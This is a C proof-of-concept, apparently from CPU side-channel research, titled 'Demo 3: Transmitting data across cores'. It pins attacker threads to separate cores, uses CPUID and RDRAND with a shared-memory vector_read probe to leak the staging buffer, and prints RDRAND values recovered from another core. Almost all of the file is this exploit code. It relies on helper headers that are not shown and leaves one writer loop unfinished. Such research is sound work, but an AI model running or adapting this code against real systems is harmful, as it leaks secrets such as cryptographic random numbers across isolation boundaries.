#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"
#include <string.h>


#define CYCLE_LENGTH 6000000

void attacker_write_char(int cpu){
    set_processor_affinity(cpu);

    char* leak_candidate_string = sample_strings[rand() % sample_string_count];
    int leak_pos = 0;

    while(1){
        if (leak_pos >= strlen(leak_candidate_string))
            break;

        usleep(CYCLE_LENGTH);
        uint64_t random_number;
        asm volatile("rdrand %0":"=r"(random_number):);

        random_number = random_number & 0xF;

        if ((char)random_number == leak_candidate_string[leak_pos]) {
            asm volatile(
            "mov $0x80000004, %%eax\n"
            "cpuid\n"
            "mfence\n"
            :::"eax");

            //TODO: Wait for the reader to signal CPUID, then continuing
            while (1) {}
        }
    }
}

void attacker_read_char(int cpu, int reps){
    set_processor_affinity(cpu);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    char staging_buffer[65];
    staging_buffer[64] = 0;

    while(reps--){
        asm volatile(
        "mov $0x80000004, %%eax\n"
        "cpuid\n"
        "mfence\n"
        :::"eax");
        while (!rdrand_section_changed(mem, byte_32)){}
        uint64_t random_number = 0;
        vector_read(mem, 20000, staging_buffer, 32, 40, 0);
        for(int i = 0; i < 8; i++) {
            random_number = random_number << 8;
            random_number += staging_buffer[32 + (8 - i - 1)];
        }
        printf("[\e[31mATTACKER\e[39m] Recovered Random Number \e[31m0x%16lx\e[39m\n", random_number);
        fflush(stdout);
    }
    munmap(mem-1, _page_size * 257);
}


int main(int argc, char **args) {
    printf("Demo 3: Transmitting data across cores.\n\n");
    _page_size = getpagesize();
    printf("Running attacker threads on CPU %d and %d.", reader_cpu, writer_cpu);
    fflush(stdout);
    uint8_t *mem =
            mmap(NULL, _page_size * 257, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0) + 1;
    memset(mem, 0xFF, _page_size * 256);
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    byte_32 = get_byte_32();
    pid = fork();
    if (!pid) attacker_write_char(writer_cpu);
    attacker_read_char(reader_cpu, 50);
    munmap(mem-1, _page_size * 257);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

